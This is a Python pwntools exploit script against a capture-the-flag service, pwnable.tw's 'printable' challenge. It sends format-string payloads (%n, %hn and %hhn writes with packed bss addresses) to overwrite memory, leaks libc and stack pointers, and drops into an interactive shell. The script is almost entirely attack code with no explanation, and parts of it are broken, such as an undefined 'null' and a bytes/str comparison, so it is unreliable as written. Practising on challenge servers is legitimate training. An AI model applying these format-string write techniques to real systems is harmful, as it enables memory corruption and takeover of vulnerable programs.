from pwn import *
import time

# r = process("./printable")
r = remote("chall.pwnable.tw", 10307)
libc = ELF('libc_64.so.6')

r.recvuntil(b"Input :")
input("@")
value = 0x1234
# r.sendline((f'%{str(value)}c%22$n').encode())
r.sendline(b"%0584c%42$hnAAA"+b"%1754c%14$n"+b"%0027c%15$hhn"+b"%0256c%16$hn%0021c%17$hhn"+p64(0x601000)+p64(0x601002)+p64(0x601020)+p64(0x601021))

'''
b *_dl_fini+819
'''
### format string: arbitrary write 
bss_stdout = 0x601020
bss_stdin = 0x601030
bss_stderr = 0x601040

input("@")
r.sendline(b"%23$p%32$p%2313c%23$hhn\x00")
try:
    leak = r.recv(256,timeout=0.5)
    if leak != null and "Segmentation" not in leak:
        print(leak)
# libc_base = leak_addr - (libc.symbols['__run_exit_handlers'] + 232)
# print(f'libc_base: {hex(libc_base)}')
# __run_exit_handlers+232
except:
    exit(-999)

r.interactive()